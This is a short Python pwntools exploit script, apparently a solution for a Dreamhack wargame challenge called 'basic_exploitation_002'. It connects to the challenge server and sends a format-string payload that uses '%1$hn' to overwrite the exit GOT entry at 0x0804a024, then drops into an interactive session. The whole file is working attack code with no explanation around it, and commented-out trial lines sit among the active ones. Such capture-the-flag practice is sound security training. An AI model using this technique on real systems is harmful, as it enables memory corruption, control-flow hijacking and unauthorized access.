#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 22755)
# elf = pwn.ELF("./basic_exploitation_002") #

#exit = elf.got['exit']
exit = 0x0804a024 #

payload = pwn.p32(exit)
#payload += pwn.p33(exit)
payload += b"%34310c"
#payload += b"%2044c"
payload += b"%1$hn"
#payload += b"%32261c"
#payload += b"%2$hn"

p.send(payload)
p.interactive()
